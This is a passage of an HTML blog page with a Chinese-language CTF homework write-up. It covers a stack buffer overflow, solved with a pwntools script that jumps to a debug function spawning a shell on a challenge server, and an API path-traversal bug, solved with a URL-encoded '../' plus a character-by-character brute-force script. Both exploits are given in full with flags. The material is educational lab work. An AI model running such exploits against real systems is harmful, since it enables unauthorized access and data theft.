+</span></span></code></pre></div><ol start="3">
+<li>
+<p><strong>Found address of funtcion debug locates on 0x4011dd</strong><br>
+透過 objdump gdb IDA 等工具可以看到 debug 函數的進入點位置為 <code>0x4011dd</code>。</p>
+</li>
+<li>
+<p><strong>Found address of variable <em>char v4[32]</em> has a size of 32 bytes</strong><br>
+從 IDA 的 stack 功能可以看到 main 函數中只有 var_20 這個變數，他佔有 32 bytes 的空間；我們需要先蓋掉 var_20 和 saved register 的記憶體才能 overflow 到 return address。如下圖。</p>
+<ul>
+<li>不重要的部分 32 + 8 = 40 bytes</li>
+<li>return address = 8 bytes，可以藉由 <code>p64(0x4011dd)</code> 方法把字串補齊成 8 bytes 大小。
+<figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 325; 
+			flex-basis: 780px"
+	>
+	<a href="/p/hw0/img-stackofmain.png" data-size="1132x348">
+		<img src="/p/hw0/img-stackofmain.png"
+			width="1132"
+			height="348"
+			srcset="/p/hw0/img-stackofmain_huac0f2e46c9c9e130a7fc40ba23bde3ea_32243_480x0_resize_box_3.png 480w, /p/hw0/img-stackofmain_huac0f2e46c9c9e130a7fc40ba23bde3ea_32243_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			alt="stack frame of main">
+	</a>
+	
+	<figcaption>stack frame of main</figcaption>
+	
+</figure>
+<figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 183; 
+			flex-basis: 439px"
+	>
+	<a href="/p/hw0/img-bof.png" data-size="1175x641">
+		<img src="/p/hw0/img-bof.png"
+			width="1175"
+			height="641"
+			srcset="/p/hw0/img-bof_hu085f745bd6e79e84764ecee1e2a511f1_156871_480x0_resize_box_3.png 480w, /p/hw0/img-bof_hu085f745bd6e79e84764ecee1e2a511f1_156871_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			alt="poc of bof">
+	</a>
+	
+	<figcaption>poc of bof</figcaption>
+	
+</figure></li>
+</ul>
+</li>
+<li>
+<p><strong>Exploit script</strong></p>
+</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 0
+</span><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># c = process(&#39;./bof&#39;)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">c</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;up.zoolab.org&#34;</span><span class="p">,</span> <span class="mi">30001</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s2">&#34;amd64&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">decode</span><span class="p">(),</span> <span class="n">end</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">decode</span><span class="p">(),</span> <span class="n">end</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">backdoor_address</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4011dd</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">c</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">40</span> <span class="o">+</span> <span class="n">backdoor_address</span><span class="p">)</span> <span class="c1">#0x4011dd -&gt; function: debug() -&gt; get webshell: system(&#34;sh&#34;) -&gt; grep -r FLAG{</span>
+</span></span><span class="line"><span class="cl"><span class="n">c</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># FLAG{d1d_y0u_ju5t_s4y_w1nd0w5?}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="web---api-leak">Web - API leak</h2>
+<p>題目公布的前後端的程式碼幾乎就包含所有線索了，原本想說先用 nmap recon 一下去戳看看有沒有隱藏的 service，也用字典檔找隱藏 endpoint，但毫無所獲，乖乖看懂程式碼然後解題吧。</p>
+<p>👉 <a class="link" href="http://splitline.tw:5000/"  target="_blank" rel="noopener"
+    >http://splitline.tw:5000/</a></p>
+<p>使用工具:</p>
+<ul>
+<li>recon: nmap</li>
+<li>exploit: F12、postman、python-requests</li>
+</ul>
+<ol>
+<li>
+<p><strong>API flow &amp; my attack flow</strong>
+<figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 110; 
+			flex-basis: 265px"
+	>
+	<a href="/p/hw0/img-api-flow.png" data-size="1041x940">
+		<img src="/p/hw0/img-api-flow.png"
+			width="1041"
+			height="940"
+			srcset="/p/hw0/img-api-flow_hu735d7e8944c77f5da69747627ac95081_177158_480x0_resize_box_3.png 480w, /p/hw0/img-api-flow_hu735d7e8944c77f5da69747627ac95081_177158_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+</li>
+<li>
+<p><strong>Found unused local endpoint</strong> <em>/looksLikeFlag</em></p>
+<ul>
+<li>在網頁正常使用下我們都不會呼叫 &ldquo;/looksLikeFlag&rdquo; 這個 api endpoint，仔細看一下後端 express 這兩個 endpoint&rsquo;s url，如果我們能透過 text 變數回到上一層就可以戳到 /looksLikeFlag 了:
+<ul>
+<li>http://127.0.0.1:7414/api/v1/emoji/${text}</li>
+<li>http://127.0.0.1:7414/api/v1/looksLikeFlag</li>
+</ul>
+</li>
+<li>一般而言我們不可能，因為 api 格式就是固定的，但題目故意開一個漏洞讓我們可以由 <code>../</code> 返回上一層。注意要做 url encoding 規避掉 regex 的 <code>.</code> 句號檢查。(其實我第一個想到的漏洞是LFI，但這題環境是 nodeJS 不是 php，<code>?file=</code>這個參數他不收)
+<figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 185; 
+			flex-basis: 445px"
+	>
+	<a href="/p/hw0/img-postman.png" data-size="1182x637">
+		<img src="/p/hw0/img-postman.png"
+			width="1182"
+			height="637"
+			srcset="/p/hw0/img-postman_huad93f68fb4b2ce287b272fee6f115870_50434_480x0_resize_box_3.png 480w, /p/hw0/img-postman_huad93f68fb4b2ce287b272fee6f115870_50434_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></li>
+</ul>
+</li>
+<li>
+<p><strong>Found response body contain a looksLikeFlag parameter, can <em>brutefource</em> to retrieve flag digit by digit.</strong></p>
+</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="p">{</span> <span class="nx">FLAG</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;./secret.js&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="nx">apiRouter</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="s1">&#39;/looksLikeFlag&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 小提示: 照理來說assert只會出現在 unit test 中，暗示 FLAG 只包含這些字元。
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">assert</span><span class="p">(</span><span class="nx">FLAG</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/^FLAG{[a-z0-9_]+}$/</span><span class="p">));</span> 
+</span></span><span class="line"><span class="cl">    <span class="c1">// includes() 會核對API參數和真實的FLAG，只會回傳 true / false。
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">({</span> <span class="nx">looksLikeFlag</span><span class="o">:</span> <span class="nx">FLAG</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">flag</span><span class="p">)</span> <span class="p">});</span> 
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span></code></pre></div><p>最終程式碼:<br>
+✅ 小技巧: 善用 string.digits 以及 string.ascii_lowercase。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 0
+</span><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Exploit the flag regex with brut-force requests</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># request body: </span>
+</span></span><span class="line"><span class="cl"><span class="c1">#   {&#34;text&#34;: &#34;%2E%2E/looksLikeFlag?flag=FLAG{xxxx}&#34;}</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#   FLAG{xxxx} is the flag</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#   We need to find out string xxxx</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">host</span> <span class="o">=</span> <span class="s2">&#34;http://splitline.tw:5000/public_api&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">exploitEndpoint</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="si">%2E%2E</span><span class="s2">/looksLikeFlag&#34;</span> <span class="c1"># goback to the other endpoint: ../looksLikeFlag</span>
+</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span> <span class="c1"># store the flag with a list</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># a-z 0-9 _ }</span>
+</span></span><span class="line"><span class="cl"><span class="n">digits</span> <span class="o">=</span> <span class="p">[</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">26</span><span class="p">)]</span> <span class="o">+</span> \
+</span></span><span class="line"><span class="cl">         <span class="p">[</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">)]</span> <span class="o">+</span> <span class="p">[</span><span class="s1">&#39;_&#39;</span><span class="p">,</span> <span class="s1">&#39;}&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># examine the flag digit by digit</span>
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">digits</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;text&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">exploitEndpoint</span><span class="si">}</span><span class="s2">?flag=FLAG</span><span class="se">{{</span><span class="si">{</span><span class="n">flag</span><span class="si">}{</span><span class="n">i</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;looksLikeFlag&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="kc">True</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="n">flag</span> <span class="o">=</span> <span class="n">flag</span> <span class="o">+</span> <span class="n">i</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">flag</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;}&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;FLAG</span><span class="se">{{</span><span class="si">{</span><span class="n">flag</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## FLAG{3asy_p4th_tr4vers4l}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+</aside>
+
+     
+     
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2023 呂晟維 - luweber88.github.io
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.2.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    
+        <aside class="sidebar right-sidebar sticky">
+            <section class="widget archives">
+                <div class="widget-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                </div>
+                <h2 class="widget-title section-title">Table of contents</h2>
+                
+                <div class="widget--toc">
+                    <nav id="TableOfContents">
+  <ol>
+    <li><a href="#crypto---image-xor">Crypto - Image xor</a></li>
+    <li><a href="#rev---global-variable-overflow">Rev - Global variable overflow</a></li>
+    <li><a href="#pwn---buffer-overflow">Pwn - Buffer overflow</a></li>
+    <li><a href="#web---api-leak">Web - API leak</a></li>
+  </ol>
+</nav>
+                </div>
+            </section>
+        </aside>
+    
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
